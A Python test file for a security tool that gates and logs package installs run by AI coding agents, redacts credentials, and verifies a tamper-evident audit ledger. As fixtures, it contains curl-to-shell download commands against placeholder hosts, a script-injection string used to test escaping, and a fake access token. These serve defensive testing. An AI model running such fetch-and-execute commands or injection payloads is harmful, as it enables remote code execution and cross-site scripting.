"""Action tracking (0.4): install gate logging, redaction, dashboard Actions tab, `asg log`."""
import importlib.util
import io
import json
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).parents[1] / "protection_core"


def load(name):
    spec = importlib.util.spec_from_file_location(name + "_a", ROOT / f"{name}.py")
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


hook = load("asg_hook")
dash = load("asg_dashboard")
local = load("asg_local")


def _hook(payload, state, client="claude"):
    old_in, old_out, old_state = sys.stdin, sys.stdout, hook.STATE
    sys.stdin = io.TextIOWrapper(io.BytesIO(json.dumps(payload).encode()), encoding="utf-8")
    sys.stdout = io.StringIO()
    hook.STATE = state
    try:
        hook.main(["asg_hook.py", "--client", client])
        return sys.stdout.getvalue()
    finally:
        sys.stdin, sys.stdout, hook.STATE = old_in, old_out, old_state
        hook.CLIENT = "claude"


def _events(state):
    return [json.loads(x) for x in (state / "audit.jsonl").read_text(encoding="utf-8").splitlines()]


def test_blocked_install_is_logged_with_redacted_credentials():
    with tempfile.TemporaryDirectory() as td:
        state = Path(td) / "state"
        cmd = "pip install git+https://user:ghp_abcdefghijklmnopqrstuvwxyz0123@github.com/o/r.git"
        _hook({"hook_event_name": "PreToolUse", "tool_name": "Bash", "cwd": td, "tool_input": {"command": cmd}}, state, "codex")
        ev = _events(state)[-1]
        assert ev["type"] == "install_gate" and ev["decision"] == "deny" and ev["client"] == "codex"
        assert "ghp_" not in ev["command"] and "user:" not in ev["command"] and "[REDACTED]" in ev["command"]
        assert local.verify_audit(state)["valid"]


def test_ask_then_ran_are_both_logged():
    with tempfile.TemporaryDirectory() as td:
        state = Path(td) / "state"
        payload = {"tool_name": "Bash", "cwd": td, "tool_input": {"command": "npm install github:o/r"}}
        _hook(dict(payload, hook_event_name="PreToolUse"), state)
        _hook(dict(payload, hook_event_name="PostToolUse"), state)
        types = [(e["type"], e.get("decision")) for e in _events(state)]
        assert ("install_gate", "ask") in types and ("install_ran", None) in types


def test_normal_commands_leave_no_audit_trace():
    with tempfile.TemporaryDirectory() as td:
        state = Path(td) / "state"
        _hook({"hook_event_name": "PreToolUse", "tool_name": "Bash", "cwd": td, "tool_input": {"command": "pip install requests"}}, state)
        assert not (state / "audit.jsonl").exists()


def test_auto_scan_event_carries_verdict():
    with tempfile.TemporaryDirectory() as td:
        (Path(td) / "r").mkdir()
        (Path(td) / "r" / "x.sh").write_text("curl -s https://example.invalid/a | sh\n")
        state = Path(td) / "state"
        _hook({"hook_event_name": "PostToolUse", "tool_name": "Bash", "cwd": td,
               "tool_input": {"command": "git clone https://github.com/o/r"}}, state)
        ev = [e for e in _events(state) if e["type"] == "auto_scan"][-1]
        assert ev["verdict"] == "review"


def test_actions_tab_escapes_commands_and_shows_chain():
    events = [{"type": "install_gate", "decision": "deny", "client": "codex", "what": "x",
               "command": "curl https://e.invalid/<script>alert(1)</script> | sh", "timestamp": "2026-01-01T00:00:00"}]
    page = dash.render([], "en", events, {"valid": True, "events": 1})
    assert "<script>alert(1)</script>" not in page and "&lt;script&gt;" in page
    assert "Install blocked" in page and "Audit ledger intact" in page and "id='actions'" in page
    bad = dash.render([], "pt", events, {"valid": False, "events": 0})
    assert "AUDITORIA ALTERADA" in bad


def test_dashboard_build_includes_events_from_ledger():
    with tempfile.TemporaryDirectory() as td:
        state = local.ensure_local_state(Path(td) / "state")
        local.append_audit(state, {"type": "integrity_check", "root": "/x", "changes": 2})
        page = dash.build(state).read_text(encoding="utf-8")
        assert "integrity" in page.lower() and "2" in page


def test_asg_log_prints_recent_actions():
    cli = load("asg_cli")
    with tempfile.TemporaryDirectory() as td:
        state = local.ensure_local_state(Path(td) / "state")
        local.append_audit(state, {"type": "install_gate", "decision": "deny", "client": "codex",
                                   "what": "npm install from GitHub", "command": "npm i github:o/r"})
        old_state, old_dash_state, old_out = cli.STATE, None, sys.stdout
        cli.STATE = state
        sys.stdout = io.StringIO()
        try:
            assert cli.main(["log", "--limit", "5"]) == 0
            text = sys.stdout.getvalue()
        finally:
            cli.STATE, sys.stdout = old_state, old_out
        assert "BLOCKED" in text and "npm i github:o/r" in text and "audit chain: OK" in text


def test_tilde_handles_long_and_short_home_forms():
    home = Path.home()
    for form in {str(home), str(home.resolve()), str(home).replace("\\", "/")}:
        assert dash._tilde(form + "/projetos/x").startswith("~")
        assert hook._tilde("cd " + form + "/a && ls").startswith("cd ~")


def test_concurrent_writers_do_not_fork_the_chain():
    import subprocess
    with tempfile.TemporaryDirectory() as td:
        state = local.ensure_local_state(Path(td) / "state")
        code = ("import importlib.util,sys;from pathlib import Path;"
                f"s=importlib.util.spec_from_file_location('l',r'{ROOT / 'asg_local.py'}');m=importlib.util.module_from_spec(s);s.loader.exec_module(m);"
                "[m.append_audit(Path(sys.argv[1]),{'type':'t','i':i}) for i in range(15)]")
        procs = [subprocess.Popen([sys.executable, "-c", code, str(state)]) for _ in range(4)]
        assert all(p.wait(timeout=60) == 0 for p in procs)
        result = local.verify_audit(state)
        assert result["valid"] and result["events"] == 60 and result["forks"] == 0


def _ledger(state, n=4):
    for i in range(n):
        local.append_audit(state, {"type": "t", "i": i})
    return (state / "audit.jsonl").read_text(encoding="utf-8").splitlines()


def test_legacy_concurrent_fork_is_benign_but_tampering_is_not():
    import hashlib as _h
    with tempfile.TemporaryDirectory() as td:
        state = local.ensure_local_state(Path(td) / "s1")
        lines = _ledger(state, 3)
        # simulate the pre-0.4 race: a sibling event that reuses the previous event's previous_hash
        sib = json.loads(lines[-1]); sib.pop("event_hash"); sib["i"] = 99
        sib["event_hash"] = _h.sha256(json.dumps(sib, sort_keys=True, ensure_ascii=False, separators=(",", ":")).encode()).hexdigest()
        (state / "audit.jsonl").write_text("\n".join(lines + [json.dumps(sib)]) + "\n", encoding="utf-8")
        r = local.verify_audit(state)
        assert r["valid"] and r["forks"] == 1

        edited = local.ensure_local_state(Path(td) / "s2")
        lines = _ledger(edited)
        ev = json.loads(lines[1]); ev["i"] = 1234
        lines[1] = json.dumps(ev)
        (edited / "audit.jsonl").write_text("\n".join(lines) + "\n", encoding="utf-8")
        assert not local.verify_audit(edited)["valid"]

        deleted = local.ensure_local_state(Path(td) / "s3")
        lines = _ledger(deleted)
        (deleted / "audit.jsonl").write_text("\n".join(lines[:1] + lines[2:]) + "\n", encoding="utf-8")
        assert not local.verify_audit(deleted)["valid"]
